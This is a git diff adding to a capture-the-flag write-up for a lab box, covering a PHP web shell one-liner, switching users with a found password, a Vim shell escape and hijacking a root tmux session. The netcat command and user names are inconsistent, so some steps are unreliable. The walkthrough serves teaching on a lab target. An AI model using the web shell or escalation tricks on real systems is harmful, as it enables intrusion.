@@ -91,7 +91,54 @@ shell.php
 ```
 <?php system($_GET['c']);?>
 ```
-  
+
+## User (www-data > ArthurMorgan)
+
+Using the php reverse shell to access the box we can find the flag in the users home directory.  
+```
+/home/ArthurMargan/user.txt
+```
+
+Switch to ArthurMorgan
+```
+su ArthorMorgan
+DeadEye
+```
+
+## User 2 (marston)
+
+Looking around the system and using linpeas shows an open port on localhost:4545
+
+```
+netstat -tulwn
+```
+
+This shows port 4545 open on local host. Lets try to connect to it and see what's on it. 
+
+```
+nc -lnvp 4545
+
+
+```
+
+Using option 4 we see VIM being used. Checking GTFObins shows us we can elevate to Marston with 
+
+```
+:!/bin/sh
+```
+To get a shell back as marston
+
+From the linpeas earlier I noticed there was a tmux session running. Lets see whats running on their. 
+
+```
+tmux attach-session -t 0
+```
+
+Killing a few sessions you can see a root window still logged in, use that to get the last flag. 
+
+![image](https://user-images.githubusercontent.com/5285547/125286984-4f0c7680-e314-11eb-93c3-2e812ac73779.png)
+
+And the box is done, thanks to the creator for this one! 
 
 
 
